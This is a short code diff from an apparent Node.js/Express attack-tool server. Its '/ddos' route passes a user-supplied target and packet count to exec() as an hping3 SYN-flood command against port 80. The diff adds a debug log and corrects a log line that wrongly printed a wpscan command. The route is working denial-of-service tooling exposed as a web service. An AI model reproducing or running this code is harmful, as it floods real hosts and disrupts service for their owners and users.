@@ -245,6 +245,7 @@ app.post(config.rootAPI + '/wpscan', (req, res) => {
 
 app.post(config.rootAPI + '/ddos', (req, res) => {
   let numberOfPaquetsInt = parseInt(req.body.numberOfPaquets)
+  console.log('INT PARSED: ', numberOfPaquetsInt)
   let matchDomainReggex = req.body.ipOrDomain.match(ValidHostnameRegex)
   let matchIpReggex = req.body.ipOrDomain.match(ValidIpAddressRegex)
   let isAValidIpOrDomain = true
@@ -267,7 +268,7 @@ app.post(config.rootAPI + '/ddos', (req, res) => {
   else{
     res.send('Neither Ipv4 IP Adress or hostname detected.')
   }
-  console.log('Commande à executer: ', `wpscan --url ${ipOrDomain}`)
+  console.log('Commande à executer: ', `hping3 -i u1 -S -p 80 -c ${numberOfPaquetsInt} ${ipOrDomain}`)
   exec(`hping3 -i u1 -S -p 80 -c ${numberOfPaquetsInt} ${ipOrDomain}`, (error, stdout, stderr) => {
     if (error) {
       console.log('Error: ', error.message)
